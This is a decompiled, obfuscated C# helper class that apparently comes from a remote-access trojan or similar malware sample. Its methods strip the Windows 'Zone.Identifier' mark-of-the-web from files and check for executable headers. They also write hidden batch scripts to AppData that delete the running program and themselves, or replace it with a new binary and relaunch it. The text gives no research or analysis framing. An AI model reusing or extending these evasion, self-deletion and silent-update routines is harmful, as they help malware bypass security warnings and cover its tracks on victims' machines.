using System;
using System.IO;
using System.Text;

// Token: 0x02000006 RID: 6
public static class GClass4
{
	// Token: 0x06000038 RID: 56 RVA: 0x00004E48 File Offset: 0x00003048
	public static string smethod_0(int length, string extension = "")
	{
		StringBuilder stringBuilder = new StringBuilder(length);
		for (int i = 0; i < length; i++)
		{
			stringBuilder.Append("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"[GClass4.random_0.Next("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".Length)]);
		}
		return stringBuilder.ToString() + extension;
	}

	// Token: 0x06000039 RID: 57 RVA: 0x00002223 File Offset: 0x00000423
	public static bool smethod_1(byte[] block)
	{
		if (block.Length < 2)
		{
			return false;
		}
		if (block[0] == 77)
		{
			if (block[1] == 90)
			{
				return true;
			}
		}
		return block[0] == 90 && block[1] == 77;
	}

	// Token: 0x0600003A RID: 58 RVA: 0x0000224F File Offset: 0x0000044F
	public static bool smethod_2(string filePath)
	{
		return GClass26.DeleteFile(filePath + ":Zone.Identifier");
	}

	// Token: 0x0600003B RID: 59 RVA: 0x00004E9C File Offset: 0x0000309C
	public static string smethod_3(bool isFileHidden)
	{
		string result;
		try
		{
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), GClass4.smethod_0(12, ".bat"));
			string contents = isFileHidden ? string.Concat(new string[]
			{
				"@echo off\necho DONT CLOSE THIS WINDOW!\nping -n 20 localhost > nul\ndel /A:H \"",
				GClass0.CurrentPath,
				"\"\ndel \"",
				text,
				"\""
			}) : string.Concat(new string[]
			{
				"@echo off\necho DONT CLOSE THIS WINDOW!\nping -n 20 localhost > nul\ndel \"",
				GClass0.CurrentPath,
				"\"\ndel \"",
				text,
				"\""
			});
			File.WriteAllText(text, contents);
			result = text;
		}
		catch (Exception)
		{
			result = string.Empty;
		}
		return result;
	}

	// Token: 0x0600003C RID: 60 RVA: 0x00004F58 File Offset: 0x00003158
	public static string smethod_4(string newFilePath, bool isFileHidden)
	{
		string result;
		try
		{
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), GClass4.smethod_0(12, ".bat"));
			string contents = isFileHidden ? string.Concat(new string[]
			{
				"@echo off\necho DONT CLOSE THIS WINDOW!\nping -n 20 localhost > nul\ndel /A:H \"",
				GClass0.CurrentPath,
				"\"\nmove \"",
				newFilePath,
				"\" \"",
				GClass0.CurrentPath,
				"\"\nstart \"\" \"",
				GClass0.CurrentPath,
				"\"\ndel \"",
				text,
				"\""
			}) : string.Concat(new string[]
			{
				"@echo off\necho DONT CLOSE THIS WINDOW!\nping -n 20 localhost > nul\ndel \"",
				GClass0.CurrentPath,
				"\"\nmove \"",
				newFilePath,
				"\" \"",
				GClass0.CurrentPath,
				"\"\nstart \"\" \"",
				GClass0.CurrentPath,
				"\"\ndel \"",
				text,
				"\""
			});
			File.WriteAllText(text, contents);
			result = text;
		}
		catch (Exception)
		{
			result = string.Empty;
		}
		return result;
	}

	// Token: 0x0600003D RID: 61 RVA: 0x00005078 File Offset: 0x00003278
	public static bool smethod_5(string filePath)
	{
		bool result;
		try
		{
			FileInfo fileInfo = new FileInfo(filePath);
			if (!fileInfo.Exists)
			{
				result = false;
			}
			else
			{
				if (fileInfo.IsReadOnly)
				{
					fileInfo.IsReadOnly = false;
				}
				result = true;
			}
		}
		catch
		{
			result = false;
		}
		return result;
	}

	// Token: 0x04000019 RID: 25
	private const string string_0 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

	// Token: 0x0400001A RID: 26
	private static readonly Random random_0 = new Random(Environment.TickCount);
}
